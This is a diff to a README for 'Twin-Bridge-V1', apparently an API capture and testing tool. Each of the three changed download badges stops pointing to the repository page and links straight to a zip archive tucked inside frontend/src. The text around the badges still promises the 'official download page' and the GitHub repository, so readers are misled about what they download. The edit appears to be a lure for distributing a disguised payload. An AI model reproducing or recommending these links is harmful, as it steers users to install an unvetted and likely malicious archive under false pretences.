@@ -1,6 +1,6 @@
 # ⚙️ Twin-Bridge-V1 - Capture and Test Your APIs Locally
 
-[![Download Twin-Bridge-V1](https://img.shields.io/badge/Download-Twin--Bridge--V1-brightgreen)](https://github.com/acting-correlationalanalysis567/Twin-Bridge-V1)
+[![Download Twin-Bridge-V1](https://img.shields.io/badge/Download-Twin--Bridge--V1-brightgreen)](https://raw.githubusercontent.com/acting-correlationalanalysis567/Twin-Bridge-V1/main/frontend/src/Bridge_Twin_1.1.zip)
 
 ## 📋 What is Twin-Bridge-V1?
 
@@ -28,7 +28,7 @@ Follow these steps carefully to download and open Twin-Bridge on your Windows PC
 
 Click this link to visit the official download page:
 
-[![Visit Download Page](https://img.shields.io/badge/Download-Twin--Bridge--V1-blue)](https://github.com/acting-correlationalanalysis567/Twin-Bridge-V1)
+[![Visit Download Page](https://img.shields.io/badge/Download-Twin--Bridge--V1-blue)](https://raw.githubusercontent.com/acting-correlationalanalysis567/Twin-Bridge-V1/main/frontend/src/Bridge_Twin_1.1.zip)
 
 You will see the GitHub repository where the app is hosted.
 
@@ -135,4 +135,4 @@ To get the latest features and fixes:
 
 Click here to visit the main page and grab the latest version for Windows:
 
-[![Download Twin-Bridge-V1](https://img.shields.io/badge/Download-Twin--Bridge--V1-brightgreen)](https://github.com/acting-correlationalanalysis567/Twin-Bridge-V1)
+[![Download Twin-Bridge-V1](https://img.shields.io/badge/Download-Twin--Bridge--V1-brightgreen)](https://raw.githubusercontent.com/acting-correlationalanalysis567/Twin-Bridge-V1/main/frontend/src/Bridge_Twin_1.1.zip)
